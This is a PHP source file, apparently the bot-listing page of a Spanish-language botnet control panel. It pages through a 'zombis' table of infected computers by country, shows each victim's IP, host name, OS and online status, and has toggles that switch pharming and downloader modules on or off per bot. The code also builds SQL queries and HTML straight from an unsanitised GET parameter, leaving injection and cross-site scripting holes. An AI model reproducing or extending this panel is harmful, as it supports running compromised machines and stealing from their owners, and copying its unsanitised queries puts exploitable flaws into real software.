<?php @session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }	?>
<?php 
require_once('../includes.php'); 




$RegistrosAMostrar=45;

if(isset($_GET['pag'])){
	$RegistrosAEmpezar=($_GET['pag']-1)*$RegistrosAMostrar;
	$PagAct=$_GET['pag'];
}else{
	$RegistrosAEmpezar=0;
	$PagAct=1;
	
}



function SiNo($x , $id , $fnc){
	global $PagAct ; 
	
	if( $x == 1 ){
		return '<img src="archivos/imagen/si.png" width="15" height="15" onclick="Des_'.$fnc.'('.$id.' , '.$PagAct.' , \''.$_GET['pais'].'\');" class="pointer" />' ;
	} else {
		return '<img src="archivos/imagen/no.png" width="15" height="15" onclick="Act_'.$fnc.'('.$id.' , '.$PagAct.' , \''.$_GET['pais'].'\');" class="pointer" />' ;
	}
	
}


$f = date("Y-m-d"); ;
$h = date("H:i:s"); ;
$h2 = date("H:i:s",strtotime("-2 minute"));  


if( $_GET['pais'] == 'Unknown' ){
	$Sql_1 = "SELECT * FROM zombis WHERE pais IS NULL ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar." , ".$RegistrosAMostrar ;
	$Sql_2 = "SELECT * FROM zombis WHERE pais IS NULL AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
	$Zombis = $DB->Select($Sql_1);
	$Online = $DB->Select($Sql_2 , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis WHERE pais IS NULL" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis WHERE pais IS NULL"));
}

if( $_GET['pais'] == 'alls' ){
	$Zombis = $DB->Select("SELECT * FROM zombis ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar . " , " . $RegistrosAMostrar);
	$Online = $DB->Select("SELECT * FROM zombis WHERE time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis"));
}

if( $_GET['pais'] != 'alls' && $_GET['pais'] != 'Unknown' ){
	$Sql_1 = "SELECT * FROM zombis WHERE pais='".$_GET['pais']."' ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar . " , " ;
	$Sql_1 .= $RegistrosAMostrar ;
	$Sql_2 = "SELECT * FROM zombis WHERE pais='".$_GET['pais']."' AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
	$Zombis = $DB->Select($Sql_1);
	$Online = $DB->Select($Sql_2 , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'"));
}




for($i=0; $i<count($Zombis); $i++){
$Sql_3 = "SELECT * FROM zombis WHERE id='".$Zombis[$i]['id']."' AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
$ZombieOnline = $DB->Select($Sql_3 , 'num_rows' , false);
if( $ZombieOnline > 0 ){
	$HtmlOnline = '<font face="Tahoma" size="1"  color="#007900">Online</font>' ;
} else {
	$HtmlOnline = '<font face="Tahoma" size="1" color="#FF2424">Offline</font>' ;
}


if( $Zombis[$i]['so'] == "Windows 7 Ultimate") { $so = "Windows 7 Ultimate" ; }

	$ZMB .= '
	  <tr>
	    <td width="3%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma">'.$Zombis[$i]['id'].'</font></div></td>
    	<td width="11%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma">'.$Zombis[$i]['name'].'</font></div></td>
	    <td width="16%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma">'.$Zombis[$i]['ip'].'</font></div></td>
    	<td width="12%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma"><img border="0" src="archivos/flags/'.strtolower($Zombis[$i]['flag']).'.png" width="16" height="11" alt="'.$Zombis[$i]['pais'].'" title="'.$Zombis[$i]['pais'].'">'.$Zombis[$i]['pais'].'</font></div></td>
	    <td width="10%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma">'.$Zombis[$i]['host'].'</font></div></td>
    	<td width="7%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma"><img border="0" src="archivos/os/'.$so.'.png" width="16" height="16" alt="'.$so.'" title="'.$so.'"> '.$Zombis[$i]['so'].'</font></div></td>
		<td width="16%"><div align="center"><font color="#CCCCCC" size="1" face="Tahoma">'.$Zombis[$i]['fecha'].'</font></div></td>
    	<td width="10%"><div align="center">
		     <font color="#CCCCCC" size="1" face="Tahoma">'.SiNo($Zombis[$i]['pharming'] , $Zombis[$i]['id'] , 'Pharming').'				</font>
	    </div></td>
    	<td width="4%"><div align="center">
		     <font color="#CCCCCC" size="1" face="Tahoma">'.SiNo($Zombis[$i]['http'] , $Zombis[$i]['id'] , 'Downloader').'				</font>
	    </div></td>
    	<td width="4%"><div align="center">
		     <font color="#CCCCCC" size="1" face="Tahoma">'.$HtmlOnline.' </font>
	    </div></td>
</tr>
	' ;
}

$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'"));

if( $_GET['pais'] == 'Unknown' ){
	$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis WHERE pais IS NULL"));
}

if( $_GET['pais'] == 'alls' ){
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis"));
}

$PagAnt=$PagAct-1;
$PagSig=$PagAct+1;
$PagUlt=$NroRegistros/$RegistrosAMostrar;
$Res=$NroRegistros%$RegistrosAMostrar;
if($Res>0) $PagUlt=floor($PagUlt)+1;
?>

<div id="div_pais" name="div_pais" style="color:#FFFFFF; font:Verdana, Arial, Helvetica, sans-serif" align="center">
<font face="Verdana" size="1"><font color="#CCCCCC"><u>Pais</u> :</font> <?php echo $_GET['pais']; ?> 
<font color="#CCCCCC">| <u>Bots Online</u> :</font> <?php print_r($Online); ?> 
<font color="#CCCCCC">| <u>Total de Bots</u> :</font> <?php echo $Totales; ?>
</font><font face="Tahoma" size="2" color="#CCCCCC"> <br>
&nbsp;</font></div>


<table width='98%' border='1' cellspacing='0' cellpadding='3' style="border-collapse: collapse" >
  <tr>
    <td width="2%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em>ID</em></font></div></td>
    <td width="13%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em><img border="0" src="archivos/heards/computer.png" width="11" height="11"> Desktop</em></font></div></td>
    <td width="18%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em><img border="0" src="archivos/heards/OTHER.gif" width="11" height="11"> IP</em></font></div></td>
    <td width="10%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em><img border="0" src="archivos/heards/world.png" width="11" height="11"> Pais</em></font></div></td>
    <td width="26%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em>Ethernet Host</em></font></div></td>
    <td width="13%" align="center" valign="middle"><div align="center">      <font face="Tahoma" size="1" color="#CCCCCC"><img src="archivos/heards/vcard.png" alt="Sistema Operativo" width="11" height="11" border="0" />O.S</font></div></td>
	<td width="13%" align="center" valign="middle"><div align="center">	  <font face="Tahoma" size="1" color="#CCCCCC"><img src="archivos/heards/date.png" alt=" " width="11" height="11" border="0" /><em>Fecha-Tiempo</em></font></div></td>
    <td width="6%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em>Phar.A</em></font></div></td>
    <td width="5%" align="center" valign="middle"><div align="center">      <font color="#CCCCCC" size="1" face="Tahoma"><em>Down.A</em></font></div></td>
    <td width="3%" align="center" valign="middle"><div align="center">      <font face="Tahoma" size="1" color="#CCCCCC"><img src="archivos/heards/win.png" alt=" " width="11" height="11" border="0" /><em>Status</em></font></div></td>
  </tr>

<?php echo $ZMB ; ?>
</table>



<div align="center"><?php
echo '<font face="Verdana" size="1" color="#FFFFFF" style="cursor:pointer">' ;
echo "<a onclick=\"Pagina('1' , '".$_GET['pais']."')\">First</a> ";
if($PagAct>1) echo "<a onclick=\"Pagina('$PagAnt' , '".$_GET['pais']."')\">Previous</a> ";
echo "<strong>Pagina ".$PagAct."/".$PagUlt."</strong>";
if($PagAct<$PagUlt)  echo " <a onclick=\"Pagina('$PagSig' , '".$_GET['pais']."')\">Following</a> ";
echo "<a onclick=\"Pagina('$PagUlt' , '".$_GET['pais']."')\">Last</a>";
echo '</div>' ;
?></div>